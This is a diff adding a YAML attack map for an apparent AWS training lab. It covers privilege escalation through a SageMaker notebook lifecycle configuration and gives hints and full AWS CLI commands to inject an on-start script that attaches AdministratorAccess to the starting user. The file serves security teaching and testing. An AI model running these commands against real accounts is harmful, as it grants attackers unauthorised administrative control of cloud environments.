@@ -1,0 +1,78 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-sagemaker-005-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has SageMaker notebook management permissions including
+        sagemaker:StopNotebookInstance, sagemaker:CreateNotebookInstanceLifecycleConfig,
+        sagemaker:UpdateNotebookInstance, and sagemaker:StartNotebookInstance on the
+        target notebook instance.
+
+    - id: notebook-instance
+      label: "Notebook Instance"
+      type: resource
+      subType: sagemaker-notebook
+      arn: "arn:aws:sagemaker:{region}:{account_id}:notebook-instance/pl-prod-sagemaker-005-to-admin-notebook"
+      description: >
+        This SageMaker notebook instance is running with an IAM execution role that has
+        AdministratorAccess. Lifecycle configuration scripts run automatically on notebook
+        startup and execute with this privileged execution role's credentials — not the
+        credentials of the user who modified the configuration.
+
+    - id: target-role
+      label: "Admin Notebook Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-sagemaker-005-to-admin-notebook-role"
+      description: >
+        This IAM role has AdministratorAccess and is used as the SageMaker notebook's
+        execution role. By injecting a malicious lifecycle configuration script, the
+        attacker causes this role to execute arbitrary code on notebook startup —
+        including granting the attacker's user account administrative privileges.
+
+  edges:
+    - from: starting-principal
+      to: notebook-instance
+      label: "sagemaker:StopNotebookInstance + sagemaker:CreateNotebookInstanceLifecycleConfig + sagemaker:UpdateNotebookInstance"
+      description: >
+        Stop the notebook instance, create a malicious lifecycle configuration containing
+        a script that grants AdministratorAccess to the starting user, then update the
+        notebook to attach the malicious lifecycle config. The notebook must be stopped
+        before its lifecycle configuration can be changed.
+      hints:
+        - "You can manage SageMaker notebook instances. Think about what happens when a notebook starts."
+        - "Lifecycle configurations run scripts automatically when a notebook starts — and they run with the notebook's execution role."
+        - "Stop the notebook, inject a malicious lifecycle config, then start it again to execute code with the notebook's admin role."
+        - "Browse to https://pathfinding.cloud/paths/sagemaker-005 for technique details."
+      commands:
+        - description: "Stop the notebook instance"
+          command: "aws sagemaker stop-notebook-instance --notebook-instance-name pl-prod-sagemaker-005-to-admin-notebook --region us-east-1"
+        - description: "Create a malicious lifecycle configuration that grants admin access to the starting user"
+          command: "aws sagemaker create-notebook-instance-lifecycle-config --notebook-instance-lifecycle-config-name pl-malicious-lifecycle-config --region us-east-1 --on-start Content=$(echo '#!/bin/bash\\naws iam attach-user-policy --user-name pl-prod-sagemaker-005-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess' | base64)"
+        - description: "Update the notebook to use the malicious lifecycle configuration"
+          command: "aws sagemaker update-notebook-instance --notebook-instance-name pl-prod-sagemaker-005-to-admin-notebook --lifecycle-config-name pl-malicious-lifecycle-config --region us-east-1"
+
+    - from: notebook-instance
+      to: target-role
+      label: "sagemaker:StartNotebookInstance"
+      description: >
+        Start the notebook instance, triggering automatic execution of the malicious
+        lifecycle configuration script. The script runs with the notebook's execution
+        role credentials (AdministratorAccess), attaching the AdministratorAccess managed
+        policy to the starting user and completing the privilege escalation.
+      commands:
+        - description: "Start the notebook instance, triggering the malicious lifecycle script"
+          command: "aws sagemaker start-notebook-instance --notebook-instance-name pl-prod-sagemaker-005-to-admin-notebook --region us-east-1"
+        - description: "Verify administrator access was granted"
+          command: "aws iam list-attached-user-policies --user-name pl-prod-sagemaker-005-to-admin-starting-user --query 'AttachedPolicies[*].PolicyArn' --output text"
